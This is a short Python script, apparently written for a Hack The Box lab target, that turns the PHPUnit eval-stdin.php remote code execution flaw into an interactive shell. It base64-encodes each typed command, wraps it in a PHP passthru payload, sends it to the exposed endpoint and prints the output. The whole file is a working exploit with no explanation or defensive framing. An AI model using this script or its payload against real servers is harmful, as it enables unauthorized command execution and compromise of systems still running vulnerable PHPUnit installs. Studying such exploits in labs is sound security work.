import requests, readline, base64

URL = "http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
while True:
    cmd = input("input: ")
    cmd = base64.b64encode(bytes("("+cmd+") 2>&1", "utf-8")).decode()
    cmd = f"<?=passthru(base64_decode('{cmd}'))?>"
    print(cmd)
    r = requests.get(URL, data=cmd)
    print(r.text)